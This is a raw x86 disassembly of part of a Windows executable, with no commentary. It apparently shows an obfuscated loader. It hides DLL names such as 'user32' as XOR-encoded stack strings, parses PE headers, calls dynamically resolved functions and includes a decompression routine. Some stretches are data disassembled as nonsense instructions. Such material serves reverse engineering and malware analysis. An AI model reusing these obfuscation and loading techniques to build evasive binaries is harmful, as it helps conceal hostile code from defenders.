  41f7d3:	loop   0x41f788
  41f7d5:	inc    edi
  41f7d6:	into   
  41f7d7:	icebp  
  41f7d8:	or     eax,0xce4e04e
  41f7dd:	pop    ds
  41f7de:	jb     0x41f7f7
  41f7e0:	div    BYTE PTR [edi+ecx*2-0x10]
  41f7e4:	es mov ebx,0xbc1c20b8
  41f7ea:	sbb    ebp,edi
  41f7ec:	adc    ch,BYTE PTR [esi]
  41f7ee:	jmp    0x5d8c1fee
  41f7f3:	mov    ebp,0x89727880
  41f7f8:	call   0x6c304e23
  41f7fd:	sbb    al,0x7e
  41f7ff:	mov    ds,ecx
  41f801:	pop    ebx
  41f802:	enter  0x6af5,0xa0
  41f806:	dec    ebp
  41f807:	test   eax,0xf25fe4c3
  41f80c:	mov    cl,0x4e
  41f80e:	sbb    BYTE PTR [esi+0x5df0eabf],dh
  41f814:	hlt    
  41f815:	push   ss
  41f816:	ror    cl,cl
  41f818:	pop    esi
  41f819:	jg     0x41f810
  41f81b:	xchg   esp,eax
  41f81c:	pop    esp
  41f81d:	inc    edi
  41f81e:	out    dx,eax
  41f81f:	mov    bl,0xf6
  41f821:	add    DWORD PTR [ebx],0xffffffbe
  41f824:	pop    es
  41f825:	sub    al,0xa
  41f827:	xchg   ebx,eax
  41f828:	push   cs
  41f829:	outs   dx,DWORD PTR ds:[esi]
  41f82a:	pusha  
  41f82b:	pop    edi
  41f82c:	stos   DWORD PTR es:[edi],eax
  41f82d:	push   ecx
  41f82e:	mov    dl,0x70
  41f830:	cmp    bl,ch
  41f832:	jle    0x41f8ad
  41f834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f835:	fwait
  41f836:	inc    edi
  41f837:	xchg   ecx,eax
  41f838:	(bad)  
  41f839:	daa    
  41f83a:	lods   al,BYTE PTR ds:[esi]
  41f83b:	les    edi,FWORD PTR [edi-0x7]
  41f83e:	out    dx,al
  41f83f:	loope  0x41f838
  41f841:	mov    eax,0x725b8d02
  41f846:	pusha  
  41f847:	pop    esi
  41f848:	xchg   ebx,eax
  41f849:	jl     0x41f8b4
  41f84b:	jecxz  0x41f8ab
  41f84d:	mov    dh,BYTE PTR [ebx+eiz*1+0x33f89fba]
  41f854:	out    dx,eax
  41f855:	fld    TBYTE PTR [edx-0x16]
  41f858:	retf   
  41f859:	not    BYTE PTR [ecx-0x5a]
  41f85c:	push   ds
  41f85d:	sbb    eax,0xb8e46c68
  41f862:	shl    DWORD PTR [esi+ebx*8],0x42
  41f866:	xchg   BYTE PTR [ebp-0x5106b70d],bh
  41f86c:	ja     0x41f81c
  41f86e:	retf   
  41f86f:	sub    BYTE PTR [eax],dh
  41f871:	sub    eax,0xbaa78c4e
  41f876:	cli    
  41f877:	jb     0x41f8ab
  41f879:	add    BYTE PTR [ebx],ch
  41f87b:	ret    0xd0b
  41f87e:	mov    ecx,0xb900426e
  41f883:	mov    bl,0x8
  41f885:	push   ecx
  41f886:	pop    es
  41f887:	or     DWORD PTR ds:0x426e85,0x426eb1
  41f891:	xor    eax,ecx
  41f893:	cmp    eax,0xf89c85e0
  41f898:	jne    0x41f8d1
  41f89e:	mov    eax,DWORD PTR [ebp+0x8]
  41f8a1:	sbb    DWORD PTR ds:0x426ef1,0x426f1d
  41f8ab:	push   esi
  41f8ac:	mov    esi,DWORD PTR [ebp+0x8]
  41f8af:	add    esi,DWORD PTR [eax+0x3c]
  41f8b2:	mov    DWORD PTR [ebp+0x8],esi
  41f8b5:	mov    eax,DWORD PTR [ebp-0x4]
  41f8b8:	mov    esi,DWORD PTR [ebp+0x8]
  41f8bb:	xor    eax,ecx
  41f8bd:	add    eax,edx
  41f8bf:	cmp    DWORD PTR [esi+0x54],eax
  41f8c2:	pop    esi
  41f8c3:	je     0x41f8d1
  41f8c9:	mov    eax,DWORD PTR [ebp+0x8]
  41f8cc:	jmp    0x41f8d8
  41f8d1:	mov    eax,DWORD PTR [ebp-0x4]
  41f8d4:	xor    eax,ecx
  41f8d6:	add    eax,edx
  41f8d8:	leave  
  41f8d9:	ret    0x4
  41f8dc:	push   ebp
  41f8dd:	mov    ebp,esp
  41f8df:	sub    esp,0xc
  41f8e2:	push   esi
  41f8e3:	mov    esi,DWORD PTR ds:0x429eb5
  41f8e9:	mov    edx,DWORD PTR ds:0x42af0d
  41f8ef:	sub    edx,esi
  41f8f1:	or     esi,DWORD PTR [esi+edx*1]
  41f8f4:	mov    eax,0xf89c85b5
  41f8f9:	adc    DWORD PTR ds:0x426ed9,edx
  41f8ff:	mov    DWORD PTR [ebp-0x8],eax
  41f902:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41f909:	sub    DWORD PTR ds:0x426ef9,0x356c
  41f913:	mov    esi,DWORD PTR [ebp-0x4]
  41f916:	add    DWORD PTR ds:0x426eed,0x182c
  41f920:	push   edi
  41f921:	mov    edi,DWORD PTR [ebp-0x8]
  41f924:	or     ecx,edx
  41f926:	mov    ecx,0x75108b3
  41f92b:	sub    DWORD PTR ds:0x426ed1,edi
  41f931:	xor    esi,ecx
  41f933:	and    DWORD PTR ds:0x426eb1,0x0
  41f93d:	mov    edx,DWORD PTR ds:0x426eb1
  41f943:	inc    edx
  41f944:	mov    DWORD PTR ds:0x426eb1,edx
  41f94a:	cmp    DWORD PTR ds:0x426eb1,0x1e
  41f951:	jle    0x41f96f
  41f957:	jmp    0x41f962
  41f95c:	call   DWORD PTR ds:0x42fa00
  41f962:	cmp    DWORD PTR ds:0x426eb1,0x19
  41f969:	jb     0x41f93d
  41f96f:	xor    edi,ecx
  41f971:	and    DWORD PTR ds:0x426e99,0x0
  41f97b:	jmp    0x41f98d
  41f980:	mov    edx,DWORD PTR ds:0x426e99
  41f986:	inc    edx
  41f987:	mov    DWORD PTR ds:0x426e99,edx
  41f98d:	cmp    DWORD PTR ds:0x426e99,0x12
  41f994:	jae    0x41f9eb
  41f99a:	cmp    DWORD PTR ds:0x426e99,0x4
  41f9a1:	ja     0x41f9eb
  41f9a7:	jmp    0x41f9cc
  41f9ac:	push   0x426efd
  41f9b1:	push   DWORD PTR [ebp-0x18]
  41f9b4:	push   DWORD PTR [ebp-0x14]
  41f9b7:	push   0x69eb
  41f9bc:	push   0x7974
  41f9c1:	push   0x5e98
  41f9c6:	call   DWORD PTR ds:0x42fa40
  41f9cc:	cmp    DWORD PTR ds:0x426e99,0x3
  41f9d3:	jne    0x41f9e6
  41f9d9:	mov    edx,DWORD PTR ds:0x426e99
  41f9df:	inc    edx
  41f9e0:	mov    DWORD PTR ds:0x426e99,edx
  41f9e6:	jmp    0x41f980
  41f9eb:	mov    edx,0x3272fa
  41f9f0:	mov    DWORD PTR ds:0x426ef5,0xc6
  41f9fa:	add    edi,edx
  41f9fc:	add    esi,edx
  41f9fe:	imul   esi,edi
  41fa01:	mov    edi,DWORD PTR [ebp+0xc]
  41fa04:	cmp    edi,esi
  41fa06:	je     0x41fa5b
  41fa0c:	mov    DWORD PTR [ebp-0xc],eax
  41fa0f:	mov    eax,DWORD PTR [ebp-0xc]
  41fa12:	mov    esi,DWORD PTR [ebp+0xc]
  41fa15:	xor    eax,ecx
  41fa17:	lea    eax,[eax*8+0x1939848]
  41fa1e:	mov    eax,DWORD PTR [esi+eax*1]
  41fa21:	mov    DWORD PTR [ebp+0xc],eax
  41fa24:	mov    eax,DWORD PTR [ebp-0x4]
  41fa27:	mov    esi,DWORD PTR [ebp-0x8]
  41fa2a:	xor    eax,ecx
  41fa2c:	xor    esi,ecx
  41fa2e:	add    esi,edx
  41fa30:	add    eax,edx
  41fa32:	imul   eax,esi
  41fa35:	mov    esi,DWORD PTR [ebp+0xc]
  41fa38:	cmp    esi,eax
  41fa3a:	je     0x41fa5b
  41fa40:	mov    eax,DWORD PTR [ebp-0x4]
  41fa43:	xor    eax,ecx
  41fa45:	mov    ecx,DWORD PTR [ebp+0xc]
  41fa48:	add    eax,edx
  41fa4a:	imul   eax,ecx
  41fa4d:	add    eax,DWORD PTR [ebp+0x8]
  41fa50:	mov    DWORD PTR [ebp+0xc],eax
  41fa53:	mov    eax,DWORD PTR [ebp+0xc]
  41fa56:	jmp    0x41fa6c
  41fa5b:	mov    eax,DWORD PTR [ebp-0x4]
  41fa5e:	mov    esi,DWORD PTR [ebp-0x8]
  41fa61:	xor    esi,ecx
  41fa63:	xor    eax,ecx
  41fa65:	add    esi,edx
  41fa67:	add    eax,edx
  41fa69:	imul   eax,esi
  41fa6c:	pop    edi
  41fa6d:	pop    esi
  41fa6e:	leave  
  41fa6f:	ret    0x8
	...
  41fa82:	add    BYTE PTR [eax],al
  41fa84:	pop    ds
  41fa85:	sbb    esi,DWORD PTR [ebp+ecx*2+0x0]
  41fa89:	add    BYTE PTR [eax],al
  41fa8b:	add    BYTE PTR [edx],al
  41fa8d:	add    BYTE PTR [eax],al
  41fa8f:	add    BYTE PTR [ecx+0x0],al
  41fa92:	add    BYTE PTR [eax],al
  41fa94:	mov    al,ds:0xa00001fa
  41fa99:	out    dx,al
  41fa9a:	add    DWORD PTR [eax],eax
  41fa9c:	add    BYTE PTR [eax],al
  41fa9e:	add    BYTE PTR [eax],al
  41faa0:	push   edx
  41faa1:	push   ebx
  41faa2:	inc    esp
  41faa3:	push   ebx
  41faa4:	mov    eax,0x6fcef3cb
  41faa9:	adc    al,0xae
  41faab:	inc    esi
  41faac:	mov    al,ds:0x1541a1ae
  41fab1:	push   esp
  41fab2:	jns    0x41fac1
  41fab4:	add    DWORD PTR [eax],eax
  41fab6:	add    BYTE PTR [eax],al
  41fab8:	inc    ebx
  41fab9:	cmp    bl,BYTE PTR [esi+eax*2+0x6f]
  41fabd:	ins    BYTE PTR es:[edi],dx
  41fabe:	fs gs jb 0x41fae2
  41fac2:	outs   dx,DWORD PTR ds:[esi]
  41fac3:	data16 and BYTE PTR [edi+0x6f],dl
  41fac7:	jb     0x41fb34
  41fac9:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  41fad0:	push   0x65
  41fad2:	arpl   WORD PTR [esp+ebx*2+0x50],si
  41fad6:	jb     0x41fb47
  41fad8:	push   0x65
  41fada:	arpl   WORD PTR [esp+edx*2+0x65],si
  41fade:	jae    0x41fb54
  41fae0:	add    BYTE PTR [ebx-0x137e13ab],cl
  41fae6:	or     BYTE PTR [ecx],al
  41fae8:	add    BYTE PTR [eax],al
  41faea:	push   ebx
  41faeb:	mov    eax,ebx
  41faed:	xchg   ecx,eax
  41faee:	mov    eax,DWORD PTR [ebp+0x8]
  41faf1:	cmp    eax,0xf89c85b5
  41faf6:	jne    0x41ff8a
  41fafc:	mov    eax,DWORD PTR [ebp+0xc]
  41faff:	cmp    eax,0xf89c85b4
  41fb04:	jne    0x41ff8a
  41fb0a:	mov    eax,DWORD PTR [ebp+0x24]
  41fb0d:	mov    DWORD PTR [ebp-0x4],eax
  41fb10:	mov    eax,DWORD PTR [ebp-0x4]
  41fb13:	mov    eax,DWORD PTR [eax+0x1d8]
  41fb19:	mov    eax,DWORD PTR [eax]
  41fb1b:	mov    eax,DWORD PTR [eax]
  41fb1d:	mov    DWORD PTR [ebp-0x8],eax
  41fb20:	mov    BYTE PTR [ebp-0x18],0xe0
  41fb24:	mov    BYTE PTR [ebp-0x17],0xdf
  41fb28:	mov    BYTE PTR [ebp-0x16],0xe2
  41fb2c:	mov    BYTE PTR [ebp-0x15],0xac
  41fb30:	mov    BYTE PTR [ebp-0x14],0xad
  41fb34:	mov    BYTE PTR [ebp-0x13],0x7b
  41fb38:	mov    BYTE PTR [ebp-0x20],0xee
  41fb3c:	mov    BYTE PTR [ebp-0x1f],0xec
  41fb40:	mov    BYTE PTR [ebp-0x1e],0xde
  41fb44:	mov    BYTE PTR [ebp-0x1d],0xed
  41fb48:	mov    BYTE PTR [ebp-0x1c],0xac
  41fb4c:	mov    BYTE PTR [ebp-0x1b],0xad
  41fb50:	mov    BYTE PTR [ebp-0x1a],0x7b
  41fb54:	mov    BYTE PTR [ebp-0x28],0xec
  41fb58:	mov    BYTE PTR [ebp-0x27],0xe3
  41fb5c:	mov    BYTE PTR [ebp-0x26],0xe7
  41fb60:	mov    BYTE PTR [ebp-0x25],0xf0
  41fb64:	mov    BYTE PTR [ebp-0x24],0xda
  41fb68:	mov    BYTE PTR [ebp-0x23],0xeb
  41fb6c:	mov    BYTE PTR [ebp-0x22],0xe2
  41fb70:	mov    BYTE PTR [ebp-0x21],0x7b
  41fb74:	xor    ecx,ecx
  41fb76:	lea    eax,[ebp+ecx*1-0x18]
  41fb7a:	movzx  edx,BYTE PTR [eax]
  41fb7d:	xor    edx,0x81
  41fb83:	add    edx,0x6
  41fb86:	inc    ecx
  41fb87:	mov    BYTE PTR [eax],dl
  41fb89:	cmp    ecx,0x6
  41fb8c:	jb     0x41fb76
  41fb8e:	xor    ecx,ecx
  41fb90:	lea    eax,[ebp+ecx*1-0x20]
  41fb94:	movzx  edx,BYTE PTR [eax]
  41fb97:	xor    edx,0x81
  41fb9d:	add    edx,0x6
  41fba0:	inc    ecx
  41fba1:	mov    BYTE PTR [eax],dl
  41fba3:	cmp    ecx,0x7
  41fba6:	jb     0x41fb90
  41fba8:	xor    ecx,ecx
  41fbaa:	lea    eax,[ebp+ecx*1-0x28]
  41fbae:	movzx  edx,BYTE PTR [eax]
  41fbb1:	xor    edx,0x81
  41fbb7:	add    edx,0x6
  41fbba:	inc    ecx
  41fbbb:	mov    BYTE PTR [eax],dl
  41fbbd:	cmp    ecx,0x8
  41fbc0:	jb     0x41fbaa
  41fbc2:	lea    eax,[ebp-0x2c]
  41fbc5:	mov    DWORD PTR [ebp-0x8],eax
  41fbc8:	mov    ecx,DWORD PTR [ebp-0x8]
  41fbcb:	mov    eax,0x7113fcef
  41fbd0:	push   esi
  41fbd1:	mov    DWORD PTR [ecx],eax
  41fbd3:	mov    ecx,DWORD PTR [ebp-0x2c]
  41fbd6:	mov    esi,0x4e3c
  41fbdb:	push   edi
  41fbdc:	lea    edi,[esi-0x2]
  41fbdf:	mov    ebx,0x3272fa
  41fbe4:	cmp    ecx,eax
  41fbe6:	jne    0x41fcb7
  41fbec:	lea    eax,[esi+0x3b]
  41fbef:	mov    WORD PTR [ebp-0x78],ax
  41fbf3:	mov    eax,esi
  41fbf5:	mov    WORD PTR [ebp-0x76],ax
  41fbf9:	add    eax,0x3d
  41fbfc:	mov    WORD PTR [ebp-0x74],ax
  41fc00:	lea    eax,[esi+0x2]
  41fc03:	mov    WORD PTR [ebp-0x72],ax
  41fc07:	add    eax,0x41
  41fc0a:	mov    WORD PTR [ebp-0x70],ax
  41fc0e:	mov    eax,edi
  41fc10:	mov    WORD PTR [ebp-0x6e],ax
  41fc14:	mov    eax,0x4f90
  41fc19:	mov    WORD PTR [ebp-0x6c],ax
  41fc1d:	lea    eax,[esi-0x7]
  41fc20:	mov    WORD PTR [ebp-0x6a],ax
  41fc24:	add    eax,0x30
  41fc27:	mov    WORD PTR [ebp-0x68],ax
  41fc2b:	lea    eax,[esi-0xb]
  41fc2e:	mov    WORD PTR [ebp-0x66],ax
  41fc32:	mov    eax,esi
  41fc34:	mov    WORD PTR [ebp-0x64],ax
  41fc38:	add    eax,0xfffffff4
  41fc3b:	mov    WORD PTR [ebp-0x62],ax
  41fc3f:	mov    eax,0x44b
  41fc44:	mov    WORD PTR [ebp-0x60],ax
  41fc48:	mov    eax,0x567a
  41fc4d:	mov    WORD PTR [ebp-0x5e],ax
  41fc51:	mov    eax,0x611a
  41fc56:	mov    WORD PTR [ebp-0x5c],ax
  41fc5a:	mov    eax,0xf1e4
  41fc5f:	mov    WORD PTR [ebp-0x5a],ax
  41fc63:	mov    eax,edi
  41fc65:	mov    WORD PTR [ebp-0x58],ax
  41fc69:	lea    eax,[ebp-0xe0]
  41fc6f:	push   eax
  41fc70:	mov    eax,DWORD PTR [ebp+0xc]
  41fc73:	xor    eax,0x75108b3
  41fc78:	add    eax,ebx
  41fc7a:	push   eax
  41fc7b:	lea    eax,[ebp-0x78]
  41fc7e:	push   eax
  41fc7f:	mov    eax,DWORD PTR [ebp-0x4]
  41fc82:	mov    eax,DWORD PTR [eax+0x198]
  41fc88:	mov    DWORD PTR [ebp-0xe0],0x1
  41fc92:	mov    DWORD PTR [ebp-0xdc],0xffff
  41fc9c:	push   DWORD PTR [eax]
  41fc9e:	mov    eax,DWORD PTR [ebp+0x10]
  41fca1:	call   eax
  41fca3:	mov    DWORD PTR [ebp-0x8],eax
  41fca6:	mov    eax,DWORD PTR [ebp-0x8]
  41fca9:	test   eax,eax
  41fcab:	je     0x41fcb7
  41fcad:	xor    DWORD PTR ds:0xe041cd9,0x9f170bc8
  41fcb7:	mov    eax,DWORD PTR [ebp-0x4]
  41fcba:	mov    ecx,DWORD PTR [eax+0x18c]
  41fcc0:	xor    eax,eax
  41fcc2:	cmp    DWORD PTR [ecx],eax
  41fcc4:	jne    0x41fefa
  41fcca:	mov    ecx,DWORD PTR [ebp-0x4]
  41fccd:	mov    ecx,DWORD PTR [ecx+0x17c]
  41fcd3:	mov    DWORD PTR [ecx],eax
  41fcd5:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd8:	mov    ecx,DWORD PTR [ecx+0x180]
  41fcde:	mov    DWORD PTR [ecx],eax
  41fce0:	mov    eax,0x4e69
  41fce5:	mov    WORD PTR [ebp-0x9c],ax
  41fcec:	mov    eax,esi
  41fcee:	mov    WORD PTR [ebp-0x9a],ax
  41fcf5:	mov    eax,0x4e79
  41fcfa:	mov    WORD PTR [ebp-0x98],ax
  41fd01:	add    eax,0xffffffc0
  41fd04:	mov    WORD PTR [ebp-0x96],ax
  41fd0b:	mov    eax,0x4f8c
  41fd10:	mov    WORD PTR [ebp-0x94],ax
  41fd17:	mov    eax,0x4e38
  41fd1c:	mov    WORD PTR [ebp-0x92],ax
  41fd23:	mov    eax,esi
  41fd25:	mov    WORD PTR [ebp-0x8c],ax
  41fd2c:	mov    eax,0x4e35
  41fd31:	mov    WORD PTR [ebp-0x8a],ax
  41fd38:	mov    eax,0x99f9
  41fd3d:	mov    WORD PTR [ebp-0x88],ax
  41fd44:	mov    eax,0x8d68
  41fd49:	mov    WORD PTR [ebp-0x86],ax
  41fd50:	mov    eax,0xd66f
  41fd55:	mov    WORD PTR [ebp-0x84],ax
  41fd5c:	mov    BYTE PTR [ebp-0x10],0xec
  41fd60:	mov    eax,0xd78b
  41fd65:	mov    WORD PTR [ebp-0x82],ax
  41fd6c:	mov    BYTE PTR [ebp-0xf],0xe3
  41fd70:	mov    eax,0x278a
  41fd75:	mov    BYTE PTR [ebp-0xe],0xe7
  41fd79:	mov    WORD PTR [ebp-0x80],ax
  41fd7d:	mov    BYTE PTR [ebp-0xd],0xf0
  41fd81:	mov    eax,0x478a
  41fd86:	mov    BYTE PTR [ebp-0xc],0xda
  41fd8a:	mov    WORD PTR [ebp-0x7e],ax
  41fd8e:	mov    eax,0x4e3b
  41fd93:	mov    BYTE PTR [ebp-0xb],0xeb
  41fd97:	push   0x8
  41fd99:	mov    BYTE PTR [ebp-0xa],0xe2
  41fd9d:	mov    WORD PTR [ebp-0x7c],ax
  41fda1:	mov    BYTE PTR [ebp-0x9],0x7b
  41fda5:	mov    DWORD PTR [ebp-0x90],0x4e3a4e65
  41fdaf:	lea    eax,[ebp-0x10]
  41fdb2:	pop    edi
  41fdb3:	movzx  ecx,BYTE PTR [eax]
  41fdb6:	xor    ecx,0x81
  41fdbc:	add    ecx,0x6
  41fdbf:	mov    BYTE PTR [eax],cl
  41fdc1:	inc    eax
  41fdc2:	dec    edi
  41fdc3:	jne    0x41fdb3
  41fdc5:	mov    DWORD PTR [ebp-0xe0],0x1
  41fdcf:	lea    eax,[ebp-0x10]
  41fdd2:	mov    DWORD PTR [ebp-0xdc],eax
  41fdd8:	mov    ecx,0x4e64
  41fddd:	mov    eax,ecx
  41fddf:	mov    WORD PTR [ebp-0x40],ax
  41fde3:	add    eax,0xf
  41fde6:	mov    edx,eax
  41fde8:	mov    WORD PTR [ebp-0x3e],dx
  41fdec:	mov    edx,0x4f9b
  41fdf1:	mov    WORD PTR [ebp-0x3c],dx
  41fdf5:	add    edx,0xfffffff8
  41fdf8:	mov    WORD PTR [ebp-0x3a],dx
  41fdfc:	mov    edx,0x4f8d
  41fe01:	mov    WORD PTR [ebp-0x38],dx
  41fe05:	inc    edx
  41fe06:	mov    WORD PTR [ebp-0x36],dx
  41fe0a:	mov    edx,0x4f87
  41fe0f:	mov    WORD PTR [ebp-0x34],dx
  41fe13:	mov    WORD PTR [ebp-0x32],cx
  41fe17:	mov    ecx,esi
  41fe19:	mov    WORD PTR [ebp-0x30],cx
  41fe1d:	lea    ecx,[edx-0x3]
  41fe20:	mov    edx,ecx
  41fe22:	mov    WORD PTR [ebp-0x54],dx
  41fe26:	mov    edx,eax
  41fe28:	mov    WORD PTR [ebp-0x52],dx
  41fe2c:	mov    edx,0x4e7b
  41fe31:	mov    WORD PTR [ebp-0x50],dx
  41fe35:	mov    WORD PTR [ebp-0x4e],ax
  41fe39:	lea    eax,[edx-0xe]
  41fe3c:	mov    WORD PTR [ebp-0x4c],ax
  41fe40:	inc    eax
  41fe41:	mov    WORD PTR [ebp-0x4a],ax
  41fe45:	lea    eax,[edx-0x14]
  41fe48:	mov    WORD PTR [ebp-0x48],ax
  41fe4c:	mov    WORD PTR [ebp-0x46],cx
  41fe50:	mov    WORD PTR [ebp-0x44],si
  41fe54:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe57:	movzx  edx,WORD PTR [ebp-0x54]
  41fe5b:	mov    eax,0x75108b3
  41fe60:	xor    ecx,eax
  41fe62:	add    ecx,ebx
  41fe64:	xor    ecx,edx
  41fe66:	mov    WORD PTR [ebp-0x54],cx
  41fe6a:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe6d:	xor    ecx,eax
  41fe6f:	movzx  eax,WORD PTR [ebp-0x40]
  41fe73:	add    ecx,ebx
  41fe75:	xor    ecx,eax
  41fe77:	xor    eax,eax
  41fe79:	mov    WORD PTR [ebp-0x40],cx
  41fe7d:	mov    WORD PTR [ebp-0xf4],ax
  41fe84:	mov    WORD PTR [ebp-0x108],ax
  41fe8b:	mov    edi,DWORD PTR [ebp+0x24]
  41fe8e:	lea    eax,[ebp-0xf4]
  41fe94:	lea    edx,[ebp-0x54]
  41fe97:	mov    DWORD PTR [ebp-0xe0],0x2
  41fea1:	mov    DWORD PTR [ebp-0xdc],eax
  41fea7:	call   0x4228e9
  41feac:	mov    ecx,DWORD PTR [ebp+0x8]
  41feaf:	mov    DWORD PTR [ebp-0xd8],eax
  41feb5:	mov    eax,0x75108b3
  41feba:	xor    ecx,eax
  41febc:	add    ecx,ebx
  41febe:	je     0x41fedd
  41fec0:	lea    ecx,[ebp-0xe0]
  41fec6:	push   ecx
  41fec7:	mov    ecx,DWORD PTR [ebp+0xc]
  41feca:	xor    ecx,eax
  41fecc:	add    ecx,ebx
  41fece:	push   ecx
  41fecf:	lea    eax,[ebp-0x9c]
  41fed5:	push   eax
  41fed6:	mov    eax,DWORD PTR [ebp+0x10]
  41fed9:	push   0x0
  41fedb:	call   eax
  41fedd:	mov    edi,DWORD PTR [ebp+0x24]
  41fee0:	lea    eax,[ebp-0x108]
  41fee6:	lea    edx,[ebp-0x40]
  41fee9:	mov    DWORD PTR [ebp-0xdc],eax
  41feef:	call   0x4228e9
  41fef4:	mov    DWORD PTR [ebp-0xd8],eax
  41fefa:	mov    eax,DWORD PTR [ebp+0x14]
  41fefd:	push   DWORD PTR [ebp-0x4]
  41ff00:	push   DWORD PTR [ebp+0x20]
  41ff03:	push   DWORD PTR [ebp+0x1c]
  41ff06:	push   DWORD PTR [ebp+0x18]
  41ff09:	push   DWORD PTR [ebp+0x10]
  41ff0c:	push   DWORD PTR [ebp+0x8]
  41ff0f:	push   DWORD PTR [ebp+0xc]
  41ff12:	call   0x42118a
  41ff17:	test   eax,eax
  41ff19:	je     0x41ff60
  41ff1b:	add    DWORD PTR [ebp-0x4],eax
  41ff1e:	push   DWORD PTR [ebp-0x4]
  41ff21:	lea    esi,[ebp+0x4]
  41ff24:	call   0x420378
  41ff29:	mov    eax,DWORD PTR [ebp-0x4]
  41ff2c:	mov    eax,DWORD PTR [eax+0x1c8]
  41ff32:	mov    eax,DWORD PTR [eax]
  41ff34:	xor    eax,0x75108b3
  41ff39:	add    eax,ebx
  41ff3b:	mov    eax,DWORD PTR [ebp-0x4]
  41ff3e:	jne    0x41ff56
  41ff40:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff43:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ff49:	push   DWORD PTR [ecx]
  41ff4b:	mov    eax,DWORD PTR [eax+0x1e0]
  41ff51:	call   DWORD PTR [eax+0x28]
  41ff54:	jmp    0x41ff60
  41ff56:	mov    eax,DWORD PTR [eax+0x17c]
  41ff5c:	mov    eax,DWORD PTR [eax]
  41ff5e:	add    DWORD PTR [esi],eax
  41ff60:	mov    eax,DWORD PTR [ebp-0x4]
  41ff63:	mov    eax,DWORD PTR [eax+0x1dc]
  41ff69:	dec    DWORD PTR [eax]
  41ff6b:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff6e:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ff74:	mov    eax,DWORD PTR [eax]
  41ff76:	lea    eax,[ecx+eax*4]
  41ff79:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff7c:	mov    ecx,DWORD PTR [ecx+0x17c]
  41ff82:	mov    eax,DWORD PTR [eax]
  41ff84:	mov    ecx,DWORD PTR [ecx]
  41ff86:	add    DWORD PTR [eax],ecx
  41ff88:	pop    edi
  41ff89:	pop    esi
  41ff8a:	pop    ebx
  41ff8b:	leave  
  41ff8c:	ret    0x20
  41ff8f:	push   edi
  41ff90:	push   esi
  41ff91:	push   ebx
  41ff92:	push   ebp
  41ff93:	mov    ebp,esp
  41ff95:	mov    eax,DWORD PTR [ebp+0x24]
  41ff98:	add    DWORD PTR [ebp+0x28],eax
  41ff9b:	push   eax
  41ff9c:	cld    
  41ff9d:	mov    esi,DWORD PTR [ebp+0x18]
  41ffa0:	add    DWORD PTR [ebp+0x1c],esi
  41ffa3:	push   esi
  41ffa4:	mov    esi,DWORD PTR [ebp+0x14]
  41ffa7:	lods   eax,DWORD PTR ds:[esi]
  41ffa8:	xchg   edx,eax
  41ffa9:	push   edx
  41ffaa:	mov    cl,BYTE PTR [esi-0x2]
  41ffad:	or     eax,0xffffffff
  41ffb0:	shl    eax,cl
  41ffb2:	not    eax
  41ffb4:	push   eax
  41ffb5:	mov    cl,dh
  41ffb7:	or     eax,0xffffffff
  41ffba:	shl    eax,cl
  41ffbc:	not    eax
  41ffbe:	push   eax
  41ffbf:	add    cl,dl
  41ffc1:	mov    edi,esi
  41ffc3:	sub    esp,0xc
  41ffc6:	sub    eax,eax
  41ffc8:	inc    eax
  41ffc9:	push   eax
  41ffca:	push   eax
  41ffcb:	push   eax
  41ffcc:	push   eax
  41ffcd:	push   eax
  41ffce:	push   edi
  41ffcf:	sub    esi,esi
  41ffd1:	push   esi
  41ffd2:	or     ebx,0xffffffff
  41ffd5:	mov    eax,0x300
  41ffda:	shl    eax,cl
  41ffdc:	lea    ecx,[eax+0x736]
  41ffe2:	mov    eax,0x4000400
  41ffe7:	shr    ecx,1
  41ffe9:	rep stos DWORD PTR es:[edi],eax
  41ffeb:	push   0x5
  41ffed:	pop    ecx
  41ffee:	call   0x4202d9
  41fff3:	loop   0x41ffee
  41fff5:	lea    esi,[esi]
  41fff7:	lea    edi,[edi]
  41fff9:	mov    edi,DWORD PTR [ebp-0x4]
  41fffc:	mov    eax,DWORD PTR [ebp-0x10]
  41ffff:	sub    edi,DWORD PTR [ebp+0x24]
  420002:	and    eax,edi
  420004:	mov    DWORD PTR [ebp-0x18],eax
  420007:	mov    al,0x0
  420009:	call   0x4202f1
  42000e:	jne    0x4200a9
  420014:	mov    cl,BYTE PTR [ebp-0xc]
  420017:	and    edi,DWORD PTR [ebp-0x14]
  42001a:	shl    edi,cl
  42001c:	sub    cl,0x8
  42001f:	neg    cl
  420021:	shr    esi,cl
  420023:	pop    eax
  420024:	add    edi,esi
  420026:	pop    esi
  420027:	lea    edi,[edi+edi*2]
  42002a:	shl    edi,0x8
  42002d:	cmp    al,0x7
  42002f:	pop    edx
  420030:	lea    ecx,[esi+edi*2+0xe6c]
  420037:	push   ecx
  420038:	push   esi
  420039:	mov    esi,0x100
  42003e:	push   eax
  42003f:	mov    al,0x1
  420041:	jb     0x420077
  420043:	mov    edi,DWORD PTR [ebp-0x4]
  420046:	sub    edi,DWORD PTR [ebp-0x24]
  420049:	movzx  edi,BYTE PTR [edi]
  42004c:	mov    ebp,DWORD PTR [ebp-0x34]
  42004f:	shl    edi,1
  420051:	mov    ecx,esi
  420053:	and    esi,edi
  420055:	add    ecx,esi
  420057:	lea    ebp,[ebp+ecx*2+0x0]
  42005b:	call   0x420310
  420060:	mov    ecx,eax
  420062:	shr    esi,0x8
  420065:	and    ecx,0x1
  420068:	cmp    esi,ecx
  42006a:	mov    esi,0x100
  42006f:	jne    0x42007f
  420071:	cmp    eax,esi
  420073:	jb     0x42004c
  420075:	jmp    0x42008b
  420077:	mov    ebp,DWORD PTR [ebp-0x34]
  42007a:	call   0x420310
  42007f:	inc    eax
  420080:	inc    esi
  420081:	sub    eax,0x1
  420084:	sub    esi,0x1
  420087:	cmp    eax,esi
  420089:	jb     0x420077
  42008b:	pop    edx
  42008c:	inc    edx
  42008d:	cmp    edx,0x5
  420090:	dec    edx
  420091:	mov    ecx,edx
  420093:	jb     0x4200a4
  420095:	inc    edx
  420096:	cmp    edx,0xb
  420099:	dec    edx
  42009a:	mov    cl,0x4
  42009c:	dec    cl
